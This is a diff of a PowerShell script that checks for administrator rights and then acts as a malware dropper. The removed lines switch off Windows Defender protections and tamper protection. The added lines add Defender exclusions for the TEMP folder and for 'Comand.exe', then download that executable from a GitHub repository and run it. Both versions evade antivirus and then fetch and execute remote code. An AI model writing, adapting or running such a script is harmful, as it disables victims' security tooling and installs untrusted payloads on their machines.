@@ -18,19 +18,12 @@ if (-not $isAdmin) {
     exit
 }
 
-# ============ DISABLE REAL-TIME + TAMPER PROTECTION ============
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableBehaviorMonitoring $true
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableScriptScanning $true
-Set-MpPreference -MAPSReporting Disabled
+# ============ ADD EXCLUSIONS (TEMP + EXE) ============
+Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath "$env:TEMP\Comand.exe" -ErrorAction SilentlyContinue
 
-# Tamper Protection -> 0
-$tp = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
-Set-ItemProperty -Path $tp -Name "TamperProtection" -Value 0 -Force
-
-# ============ DOWNLOAD + RUN MSI ============
-$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand%20Setup.msi"
-$out = Join-Path $env:TEMP "Comand Setup.msi"
+# ============ DOWNLOAD + RUN EXE ============
+$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe"
+$out = Join-Path $env:TEMP "Comand.exe"
 Invoke-WebRequest -Uri $url -OutFile $out
 Start-Process $out
